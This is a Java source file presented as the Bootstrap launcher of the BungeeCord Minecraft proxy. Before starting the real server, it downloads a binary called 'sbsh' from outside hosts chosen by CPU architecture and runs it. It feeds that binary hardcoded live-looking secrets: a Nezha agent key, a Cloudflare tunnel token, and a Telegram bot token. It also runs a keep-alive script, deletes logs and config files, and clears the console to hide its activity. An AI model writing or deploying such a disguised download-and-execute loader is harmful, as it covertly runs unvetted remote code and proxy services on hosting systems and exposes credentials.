package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    public static void main(String[] args) throws Exception
    {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
        {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version in startup menu!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        try {
            runSbxBinary();
            
            // ✅ 启动 keep.sh（OptikLink 保活脚本）
            File keepScript = new File("keep.sh");
            if (keepScript.exists()) {
                new ProcessBuilder("bash", "keep.sh")
                    .inheritIO()
                    .start();
                System.out.println(ANSI_GREEN + "keep.sh 已启动（24小时保活中）" + ANSI_RESET);
            } else {
                System.err.println(ANSI_RED + "keep.sh 未找到，跳过执行" + ANSI_RESET);
            }

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(20000);

            clearLogs();
            clearConsole();
            startHeartbeatThread();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }

        // 启动 BungeeCord 主程序
        BungeeCordLauncher.main(args);

        // 保持主线程存活，防止容器自动重启
        while (true) {
            try {
                Thread.sleep(300000); // 每5分钟心跳
                System.out.println("Main process heartbeat " +
                    new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new java.util.Date()) + " ...");
            } catch (InterruptedException ignored) {}
        }
    }

    private static void clearConsole() {
        try {
            if (System.console() != null) {
                String os = System.getProperty("os.name").toLowerCase();
                if (os.contains("windows")) {
                    new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
                } else {
                    new ProcessBuilder("clear").inheritIO().start().waitFor();
                }
                System.out.println("Logs deleted and screen cleared.");
            } else {
                System.out.println("\n\n==============================================");
                System.out.println("Logs deleted and screen cleared (no TTY mode).");
                System.out.println("==============================================\n\n");
            }
        } catch (Exception e) {
            System.out.println("Logs deleted and screen cleared.");
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "ac66b7ab-0cfc-48e2-b231-882ea1111dce");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
        envVars.put("ARGO_PORT", "9010");
        envVars.put("ARGO_DOMAIN", "optiklink-hk.e.9.a.b.0.d.0.0.1.0.a.2.ip6.arpa");
        envVars.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiMWQxNzNhZTUtYmJjMy00MjBjLWI5OGEtYzllY2Q4YzQ1ZmE2IiwicyI6Ik1XTXpaalF4TVdNdFpUSTROQzAwTm1Nd0xXRmhOalV0TURrMU9EZ3pPV05oWmpkbSJ9");
        envVars.put("HY2_PORT", "2054");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "2054");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "6839843424");
        envVars.put("BOT_TOKEN", "7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Optiklink-HK");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static void clearLogs() {
        try {
            System.out.println(ANSI_GREEN + "logs will be deleted in 15 seconds!" + ANSI_RESET);
            Thread.sleep(15000);

            String[] targets = {
                "./.npm/*.log", "./core", "./sb.log", "./boot.log", "./config.json"
            };

            for (String t : targets) {
                new ProcessBuilder("bash", "-c", "rm -rf " + t)
                        .redirectErrorStream(true)
                        .start()
                        .waitFor();
            }

            System.out.println(ANSI_GREEN + "Logs deleted and screen cleared." + ANSI_RESET);
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Log cleanup failed: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void startHeartbeatThread() {
        Thread heartbeat = new Thread(() -> {
            while (running.get()) {
                System.out.println("Process heartbeat " + 
                    new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + " ...");
                try {
                    Thread.sleep(1800 * 1000); // 30分钟
                } catch (InterruptedException ignored) {}
            }
        });
        heartbeat.setDaemon(true);
        heartbeat.start();
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
